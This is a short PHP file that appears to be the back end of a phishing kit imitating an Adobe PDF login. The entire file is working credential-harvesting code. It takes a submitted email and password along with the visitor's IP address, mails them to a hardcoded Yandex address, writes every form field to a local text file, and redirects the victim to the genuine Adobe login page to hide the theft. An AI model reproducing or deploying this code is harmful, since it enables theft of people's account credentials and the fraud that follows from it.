<?php 
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$name = $_POST['Email'];
$password = $_POST['password'];
$chasem3="hallinznxz@yandex.com";


  $subj = "PDF $ip";
  $msg = "Email: $name\nPassword: $password\n$ip\n-----------------------------------\n      Live  Created By MITCH\n-----------------------------------";
  $from = "From: <hallinznxz@yandex.com>";
    mail("$chasem3", $subj, $msg, $from);

header ('Location: https://adobeid-na1.services.adobe.com/renga-idprovider/pages/login.do/ ');
    $handle = fopen("kiki.txt", "a");
    foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
    }
    fwrite($handle, "\r\n");
    fclose($handle);
    exit;
?>








